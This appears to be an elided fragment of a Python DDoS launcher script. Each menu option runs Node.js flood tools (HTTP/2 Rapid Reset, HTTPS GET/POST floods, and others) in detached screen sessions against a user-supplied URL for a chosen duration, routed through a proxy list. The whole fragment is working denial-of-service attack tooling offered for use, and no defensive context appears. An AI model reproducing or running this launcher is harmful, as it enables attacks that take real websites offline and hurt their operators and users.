...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node ACK.js {url} {duration} 64 10 proxy.txt')
...
""")
                    ...
                    os.system(f'screen -dm node Cat.js {url} {duration} 10 64 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()
...
""")
                    ...
                    os.system(f'screen -dm node livex.js {url} {duration} 10 64 proxy.txt --debug=true --ua=all --querystring=true')
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node H2-Rapid-Reset.js GET {duration} 10 proxy.txt 64 {url}')
                    os.system(f'screen -dm node H2-Rapid-Reset.js POST {duration} 10 proxy.txt 64 {url}')
            except ValueError:
                main()
            except IndexError:
                main()
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node PRIV-CIKO.js {url} {duration} 64 10 proxy.txt')
                    os.system(f'screen -dm node RAPID.js {url} {duration} 64 10 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node HTTPS.js GET {url} {duration} 10 64 proxy.txt')
                    os.system(f'screen -dm node HTTPS.js POST {url} {duration} 10 64 proxy.txt')
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node barave.js {url} {duration} 64 10 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node HTTP-X.js {url} {duration} 64 10 proxy.txt')
